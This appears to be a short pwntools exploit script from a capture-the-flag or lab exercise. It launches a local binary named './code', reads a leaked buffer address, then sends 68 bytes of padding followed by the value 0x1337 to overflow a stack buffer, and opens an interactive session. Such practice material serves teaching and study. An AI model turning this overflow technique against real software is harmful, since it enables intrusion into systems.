from pwn import *

p = process("./code")
p.recvuntil("at ")
buf = int(p.recv(8), 16)

print("{:#x}".format(buf))

p.sendline("".ljust(64, "A") + "A" * 4 + p32(0x1337))

p.interactive()
